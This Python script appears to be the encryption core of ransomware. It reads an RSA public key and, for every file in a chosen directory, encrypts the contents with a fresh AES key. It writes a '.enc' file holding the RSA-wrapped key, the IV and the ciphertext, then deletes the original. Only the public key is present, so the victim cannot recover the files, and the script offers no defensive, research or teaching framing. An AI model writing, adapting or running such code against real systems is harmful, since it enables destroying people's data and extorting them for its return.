from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto import Random
from Crypto.Util.Padding import pad
import os

directory = '<path to dir>'

rsa_cipher = None
key_size = 32

def get_rsa():
    with open('<rsa public key>','r') as f:
        rsa_key = RSA.importKey(f.read())
    return PKCS1_OAEP.new(rsa_key)
    
def encrypt_file(file):
    global rsa_cipher
    global key_size
    key = Random.new().read(key_size)
    enc_key = rsa_cipher.encrypt(key)
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    data = ''
    with open(file,'rb') as f:
        data = f.read()
    
    enc_data = cipher.encrypt(pad(data, key_size))
    
    with open(file+'.enc', 'wb') as f:
        f.write(enc_key+iv+enc_data)

def main():
    global rsa_cipher
    rsa_cipher = get_rsa()
    for filename in os.listdir(directory):
        file = os.path.join(directory, filename)
        if os.path.isfile(file) and ".enc" not in file:
            encrypt_file(file)
            os.remove(file)
        
        
if __name__ == "__main__":
    main()
